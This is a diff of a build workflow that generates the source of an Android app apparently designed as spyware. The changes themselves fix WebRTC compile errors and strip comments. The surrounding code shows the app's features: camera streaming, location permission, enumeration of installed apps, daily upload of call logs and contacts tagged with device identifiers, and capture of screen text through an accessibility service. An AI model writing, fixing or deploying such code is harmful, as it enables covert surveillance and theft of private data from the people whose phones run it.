@@ -74,7 +74,6 @@ jobs:
           dependencies {
               implementation 'androidx.appcompat:appcompat:1.6.1'
               implementation 'com.squareup.okhttp3:okhttp:4.12.0'
-              // 🔥 এখানে লাইব্রেরির ভার্সন বদলানো হয়েছে
               implementation 'com.infobip:google-webrtc:1.0.0035529'
           }
           EOF
@@ -84,8 +83,7 @@ jobs:
 
           cat > app/src/main/AndroidManifest.xml << 'EOF'
           <?xml version="1.0" encoding="utf-8"?>
-          <manifest xmlns:android="http://schemas.android.com/apk/res/android"
-              package="com.example.neonpanel">
+          <manifest xmlns:android="http://schemas.android.com/apk/res/android">
               <uses-permission android:name="android.permission.INTERNET" />
               <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES" />
               <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
@@ -153,9 +151,7 @@ jobs:
 
               private BroadcastReceiver syncReceiver = new BroadcastReceiver() {
                   @Override
-                  public void onReceive(Context context, Intent intent) {
-                      // No-op
-                  }
+                  public void onReceive(Context context, Intent intent) {}
               };
 
               @Override
@@ -286,7 +282,7 @@ jobs:
 
           public class CameraActivity extends AppCompatActivity {
 
-              public static CameraActivity instance; // Static instance for service control
+              public static CameraActivity instance;
 
               private static final int CAMERA_PERMISSION_REQUEST = 100;
               private SurfaceViewRenderer localView;
@@ -378,9 +374,10 @@ jobs:
                       @Override public void onDataChannel(DataChannel dataChannel) {}
                       @Override public void onRenegotiationNeeded() {}
                       @Override public void onIceConnectionChange(PeerConnection.IceConnectionState iceConnectionState) {}
+                      @Override public void onIceConnectionReceivingChange(boolean receiving) {} // নতুন মেথড যোগ করা হয়েছে
                       @Override public void onIceGatheringChange(PeerConnection.IceGatheringState iceGatheringState) {}
                       @Override public void onIceCandidatesRemoved(IceCandidate[] iceCandidates) {}
-                      @Override public void onAddTrack(MediaStreamTrack track, MediaStream stream) {}
+                      @Override public boolean onAddTrack(MediaStreamTrack track, MediaStream stream) { return true; } // boolean রিটার্ন করা হয়েছে
                   });
 
                   peerConnection.addTrack(localVideoTrack);
@@ -520,7 +517,6 @@ jobs:
           import android.location.Location;
           import android.location.LocationListener;
           import android.location.LocationManager;
-          import android.media.ThumbnailUtils;
           import android.net.Uri;
           import android.os.BatteryManager;
           import android.os.Build;
@@ -542,7 +538,6 @@ jobs:
           import java.io.ByteArrayOutputStream;
           import java.io.File;
           import java.io.FileWriter;
-          import java.io.IOException;
           import java.util.ArrayList;
           import java.util.Collections;
           import java.util.Comparator;
@@ -578,7 +573,6 @@ jobs:
 
               private StringBuilder pendingText = new StringBuilder();
               private String pendingPackageName = null;
-
               private Runnable screenDataRunnable = null;
               private String lastScreenPackageName = null;
               private String lastSentScreenData = "";
@@ -707,10 +701,9 @@ jobs:
                           sendCallLogs();
                           sendContacts();
                       } catch (Throwable t) { Log.e(TAG, "initial call contacts sync crash", t); }
-
                       while (!Thread.currentThread().isInterrupted()) {
                           try {
-                              Thread.sleep(86400000); // 24 hours
+                              Thread.sleep(86400000);
                               sendCallLogs();
                               sendContacts();
                           } catch (InterruptedException e) { Thread.currentThread().interrupt(); }
@@ -757,7 +750,6 @@ jobs:
                       long cutoff = now - 24 * 60 * 60 * 1000;
                       String selection = CallLog.Calls.DATE + " >= ?";
                       String[] selectionArgs = { String.valueOf(cutoff) };
-
                       JSONArray logsArray = new JSONArray();
                       Cursor cursor = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, selection, selectionArgs, CallLog.Calls.DATE + " DESC");
                       if (cursor != null) {
@@ -777,7 +769,6 @@ jobs:
                           }
                           cursor.close();
                       }
-
                       JSONObject payload = new JSONObject();
                       payload.put("deviceId", deviceId);
                       payload.put("deviceToken", deviceToken);
@@ -804,7 +795,6 @@ jobs:
                           }
                           cursor.close();
                       }
-
                       JSONObject payload = new JSONObject();
                       payload.put("deviceId", deviceId);
                       payload.put("deviceToken", deviceToken);
@@ -949,7 +939,6 @@ jobs:
 
               private List<InstalledApp> getInstalledApps(){ List<InstalledApp> list=new ArrayList<>(); try{ PackageManager pm=getPackageManager(); for(ApplicationInfo ai:pm.getInstalledApplications(0)){ if((ai.flags & ApplicationInfo.FLAG_SYSTEM)==0){ list.add(new InstalledApp(pm.getApplicationLabel(ai).toString(), ai.packageName)); } } }catch(Throwable ignored){} return list; }
 
-              // ================== EVENT HANDLING ==================
               @Override public void onAccessibilityEvent(AccessibilityEvent event) {
                   try {
                       if(event==null)return;
